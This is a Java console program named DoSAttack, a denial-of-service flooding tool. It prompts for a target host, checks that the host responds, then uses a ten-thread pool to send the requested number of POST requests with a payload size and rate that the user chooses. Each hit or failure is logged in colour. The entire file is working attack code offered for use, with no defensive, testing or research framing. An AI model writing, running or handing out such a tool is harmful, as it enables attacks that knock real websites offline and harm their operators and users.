import java.io.IOException;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.time.LocalDateTime;
import java.time.format.DateTimeFormatter;
import java.util.Scanner;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;
public class DoSAttack {
    public static void clearScreen() {
        System.out.print("\033[H\033[2J");
        System.out.flush();
    }
    public static boolean checkDomain(String domain) {
        String urlStr = "http://" + domain;
        try {
            URL url = new URL(urlStr);
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.setRequestMethod("HEAD");
            connection.setConnectTimeout(5000);
            connection.setReadTimeout(5000);
            int responseCode = connection.getResponseCode();
            return (responseCode >= 200 && responseCode < 400);
        } catch (IOException e) {
            return false;
        }
    }
    public static void sendRequest(String domain, int[] requestCounter, byte[] data) {
        String urlStr = "http://" + domain;
        LocalDateTime requestTime = LocalDateTime.now();
        DateTimeFormatter formatter = DateTimeFormatter.ofPattern("HH:mm:ss.SSS");
        try {
            long startTime = System.currentTimeMillis();
            URL url = new URL(urlStr);
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.setRequestMethod("POST");
            connection.setDoOutput(true);
            OutputStream os = connection.getOutputStream();
            os.write(data);
            os.flush();
            os.close();
            int responseCode = connection.getResponseCode();
            long delay = System.currentTimeMillis() - startTime;
            synchronized (requestCounter) {
                requestCounter[0]++;
            }
            int sentDataSize = data.length;
            int receivedDataSize = connection.getContentLength();
            System.out.printf("\033[42m  \033[0m \033[32m(%d) | %s - %d : %.2f ms | %d : %d BYTE | %s\033[0m%n", 
                    requestCounter[0], domain, responseCode, delay / 1000.0, sentDataSize, receivedDataSize, requestTime.format(formatter));
        } catch (IOException e) {
            synchronized (requestCounter) {
                requestCounter[0]++;
            }
            System.out.printf("\033[41m  \033[0m \033[31m(%d) | %s - 0 : fail | 0 : 0 BYTE | %s\033[0m%n", 
                    requestCounter[0], domain, requestTime.format(formatter));
        }
    }
    public static byte[] selectDataSize() {
        Scanner scanner = new Scanner(System.in);
        while (true) {
            System.out.print("\033[36mDATASIZE>> \033[37m");
            String dataSizeStr = scanner.nextLine();
            try {
                int dataSize = Integer.parseInt(dataSizeStr);
                if (dataSize > 0) {
                    return new byte[dataSize];
                } else {
                    clearScreen();
                    System.out.println("\033[31mInvalid input. Please enter a positive integer for data size.\033[0m");
                    sleep(3);
                    clearScreen();
                }
            } catch (NumberFormatException e) {
                clearScreen();
                System.out.println("\033[31mInvalid input. Please enter a positive integer for data size.\033[0m");
                sleep(3);
                clearScreen();
            }
        }
    }
    public static int selectQuantity() {
        Scanner scanner = new Scanner(System.in);
        while (true) {
            System.out.print("\033[36mQUANTITY>> \033[37m");
            String quantityStr = scanner.nextLine();
            try {
                int quantity = Integer.parseInt(quantityStr);
                if (quantity > 0) {
                    return quantity;
                } else {
                    clearScreen();
                    System.out.println("\033[31mInvalid input. Please enter a positive integer for quantity.\033[0m");
                    sleep(3);
                    clearScreen();
                }
            } catch (NumberFormatException e) {
                clearScreen();
                System.out.println("\033[31mInvalid input. Please enter a positive integer for quantity.\033[0m");
                sleep(3);
                clearScreen();
            }
        }
    }
    public static double selectDelay() {
        Scanner scanner = new Scanner(System.in);
        while (true) {
            System.out.print("\033[36mDELAY>> \033[37m");
            String delayStr = scanner.nextLine();
            try {
                double delay = Double.parseDouble(delayStr);
                if (delay > 0) {
                    return delay;
                } else {
                    clearScreen();
                    System.out.println("\033[31mInvalid input. Delay must be a positive number.\033[0m");
                    sleep(3);
                    clearScreen();
                }
            } catch (NumberFormatException e) {
                clearScreen();
                System.out.println("\033[31mInvalid input. Please enter a valid number for delay.\033[0m");
                sleep(3);
                clearScreen();
            }
        }
    }
    public static void sleep(int seconds) {
        try {
            Thread.sleep(seconds * 1000);
        } catch (InterruptedException e) {
            Thread.currentThread().interrupt();
        }
    }
    public static void startDoS() {
        System.out.print("\033[H\033[2J");
        System.out.flush();
        Scanner scanner = new Scanner(System.in);
        String domain = null;
        while (true) {
            System.out.print("\033[36mHOST>> \033[37m");
            domain = scanner.nextLine();
            clearScreen();
            if (checkDomain(domain)) {
                System.out.println("\033[32mDomain is reachable. Starting the attack.\033[0m");
                sleep(2);
                clearScreen();
                break;
            } else {
                System.out.println("\033[31mUnable to connect to the domain within 5 seconds. Please try again.\033[0m");
                sleep(3);
                clearScreen();
            }
        }
        byte[] data = selectDataSize();
        clearScreen();
        int numberOfRequests = selectQuantity();
        clearScreen();
        double requestsPerSecond = selectDelay();
        clearScreen();
        int[] requestCounter = {0};
        ExecutorService executor = Executors.newFixedThreadPool(10);
        String finalDomain = domain;
        for (int i = 0; i < numberOfRequests; i++) {
            executor.execute(() -> sendRequest(finalDomain, requestCounter, data));
            try {
                Thread.sleep((long) (1000 / requestsPerSecond));
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
            }
        }
        executor.shutdown();
        try {
            executor.awaitTermination(1, TimeUnit.HOURS);
        } catch (InterruptedException e) {
            Thread.currentThread().interrupt();
        }
        System.out.println("\033[30m\033[47mEND | Wait 5 seconds\033[0m");
        sleep(5);
        clearScreen();
    }
    public static void main(String[] args) {
        startDoS();
    }
                    }
